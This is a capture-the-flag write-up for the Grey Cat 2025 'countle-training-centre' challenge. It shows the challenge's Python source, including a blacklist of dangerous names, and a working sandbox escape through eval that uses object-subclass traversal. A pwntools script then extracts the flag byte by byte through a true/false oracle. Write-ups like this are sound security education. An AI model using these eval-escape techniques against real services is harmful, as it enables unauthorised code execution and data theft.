+++
title = 'Grey Cat the Flag 2025 - misc/countle-training-centre'
date = 2025-06-01T19:02:16-04:00
draft = false
+++

The challenge presents a math game where we have to solve expressions to reach target numbers 1,1,000,000. 
```shell
╔════════════════╗
║ Puzzle #1      ║
╚════════════════╝
 Target: 234
 Nums: 25 6 2 4 3 4

```
The actual challenge is escaping a python sandbox. Looking at the source:

```python
#!/usr/local/bin/python

from re import match
from sys import exit
from time import sleep
from countle_puzzle import generateSolvablePuzzle

def format(s):
    return (s.replace('~E',"\033[0m").replace('~R',"\033[0;1;31m").replace('~N',"\033[0;1;7;31m")
      .replace('~w',"\033[7;37m").replace('~u',"\33[4;31m").replace('~Gr',"\33[0;90m").replace('~r',"\33[0;31m")
      .replace('~G',"\033[0;1;32m").replace('~B',"\033[1;34m")).replace('~W',"\033[1;4;37m")

def banner():
    return format(r"""
  ~R(     *   )    (
  )\  ` )\  /(   )\
 (((_)  ( )(_))(((_)
)\\~E___ ~R(~E_~R(~E_~R()) )\\~E___
~R((~w/ __|~E ~w|_   _|~R((~w/ __|~E
 ~w| (~E__    ~w| |~E   ~w| (~E
  ~w\___|~E   ~w|_|~E    ~w\___|~E

     ~RWelcome to the~E
~NCountle Training Centre!~E
""")

def goal():
    return format(r"""
~RToday's Goal:~E
 ╔════════════════════╗
 ║ ~u1,000,000~E problems ║
 ╚════════════════════╝
            ~Gr^consecutive~E
""")

def menu():
    return ("""
Menu:
 [S] Start Challenge
 [H] Help
 [B] Blacklist
 [Q] Quit
 """)

def help():
    return format(r"""~WHow to play?~E

Combine the given numbers using
  ~Baddition (+)~E,
  ~Bsubtraction (-)~E,
  ~Bmultiplication (*)~E, and
  ~Bdivision(/)~E
to reach the target.

~R!! No negative numbers or fractions allowed !!~E

For e.g.
  ~BTarget: 947
  Nums: 100 7 4 5 9 7~E

  Valid solution:
  ~G((100 + 7) * (4 + 5) - 9 - 7)~E
""")

# Blacklisted word, not allowed in input
BLACKLIST = ['breakpoint', 'builtins' 'cat', 'compile', 'dict', 'eval', 'exec', 'getframe',
             'help', 'import', 'input', 'inspect', 'open', 'os', 'sh', 'signal' 'subprocess', 'system']

def blacklist():
    return format(r"""~RBlacklist:~E
 ~rbreakpoint
 builtins
 cat
 compile
 dict
 eval
 exec
 getframe
 help
 import
 input
 inspect
 open
 os
 sh
 signal
 subprocess
 system~E
""")

# Remove breakpoint and help, too powerful
__builtins__.__dict__.pop('breakpoint')
__builtins__.__dict__.pop('help')

def checkAnswer(expr, target):
    result = eval(expr, {'FLAG':"no flag for you", "__builtins__": None})
    return result == target

def challenge():
    for _ in range(1000000):
        n,t = generateSolvablePuzzle()
        print("╔════════════════╗")
        print("║ Puzzle #" + str(_+1).ljust(6) + " ║")
        print("╚════════════════╝")
        print(format(r" ~BTarget: " + str(t) + "\n Nums:"), *n, format(r"~E"), "\n")
        expr = input(" Your Answer:\n > ")
        print()

        if (not match(r"[0-9+\-*/()]+", expr)):
            return (print(format("~RThat is not a valid expression. Read 'Help' for more info.~E")))
        elif (len(expr) > 160):
            return (print(format("~RWhat are you doing with so many characters? Read 'Help' for more info.~E")))
        for b in BLACKLIST + [str(t)]:
            if b in expr:
                return (print(format("~RBlacklisted word is not allowed: "+b+"~E")))
        if (not checkAnswer(expr, t)):
            print(format(" ~Rtsk tsk tsk...\n Your answer is wrong!\n I'm dissapointed...~E"))
            exit(0)
        else:
            print(format(" ~GCorrect!~E\n"))
            sleep(0.1) # rate limit
        if (_ == 999999):
            print(format(" ~GCongrats!! Here is your flag:\n   " + FLAG + "~E"))
            exit(0)


FLAG = "flag{placeholder}}"

if __name__ == "__main__":
    print(banner())
    print(goal())
    while (1):
        print(menu())
        choice = input("> ").upper()[0]
        print()
        if (choice == 'S'):
            challenge()
        elif (choice == 'H'):
            print(help())
        elif (choice == 'B'):
            print(blacklist())
        elif (choice == 'Q'):
            exit(0)

```


```python
def checkAnswer(expr, target):
    result = eval(expr, {'FLAG':"no flag for you", "__builtins__": None})
    return result == target
```

The `checkAnswer` function, which:
- Uses `eval()` to execute user input
- Sets `__builtins__` to `None` (disabling built-in functions)
- Overwrites `FLAG` with a fake value in the local context
- Only returns boolean result (doesn't print the actual evaluation)



```python
if (not match(r"[0-9+\-*/()]+", expr)):
    return (print(format("~RThat is not a valid expression...")))
```

There is regex validation on user input, and blacklist:

```python
BLACKLIST = ['breakpoint', 'builtins' 'cat', 'compile', 'dict', 'eval', 'exec', 
             'getframe', 'help', 'import', 'input', 'inspect', 'open', 'os', 
             'sh', 'signal' 'subprocess', 'system']
```

One issue is that  match only checks the beginning of a string, not the whole string!

```python
if (not match(r"[0-9+\-*/()]+", expr)):
```

We can use `()`, so we can access Python's object heirarch through the empty tuple:

```python
().__class__.__base__.__subclasses__()
```
This gives us access to all classes that inherit from `object`, which includes many useful classes with access to modules and built-in functions.



Afer playing around for a while I found `_sitebuiltins.Quitter` at index 156 which works perfectly:

```python
().__class__.__base__.__subclasses__()[156].__init__.__globals__
```

One issue I ran into was the server was running an older version of python, so the list of subclasses was different. We were given a Dockerfile so I used that for local testing and finding the right offset.

### Step 3: Accessing the Real FLAG

The real FLAG variable exists in the `__main__` module's global scope, which we can access via:

```python
().__class__.__base__.__subclasses__()[156].__init__.__globals__['sys'].modules['__main__'].FLAG
```

Since `eval()` doesn't print results, we need to extract the flag character by character using boolean logic:

```python
(().__class__.__base__.__subclasses__()[156].__init__.__globals__['sys'].modules['__main__'].FLAG[0]=='f')+TARGET-1
```

We are supposed to be evauling math expressions. If our answers = Target, then we get back `Correct!`, otherwise `Wrong`. We can compare a byte in the flag to a char, and if it is correct, our expression evaluates to `True`. True in python is equal to 1, and False is zero. So if we add a True expression to Target -1, we get the correct value and `Correct!`. Using this, we can extract the flag byte by byte. See script below:


```python
from pwn import *
import time

context.log_level = "ERROR"


flag = "grey{"
index = 5
all_chars = '1234567890_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\()*+,-./:;<=>?@[\\]^_{|}~'


while True:
    for ch in all_chars:
        target = remote("challs.nusgreyhats.org", 33401 )
        target.sendline("S")
        target.recvuntil("Target: ")
        value = int(target.recvuntil("\n", drop=True)) - 1
        target.recvuntil(b"> ")
        payload = f"(().__class__.__base__.__subclasses__()[156].__init__.__globals__['sys'].modules['__main__'].FLAG[{index}]=='{ch}')+{value}"
        target.sendline(payload)
        resp = target.recvall(timeout=1)
        if b"Correct!" in resp:
            flag +=ch
            index += 1
            print(flag)
            target.close()
            break
        else:
            time.sleep(.05)
            target.close
```

`grey{4_w0r1D_c1As5_c0Un7L3_p1aY3r_1n_0uR_mId5t}`

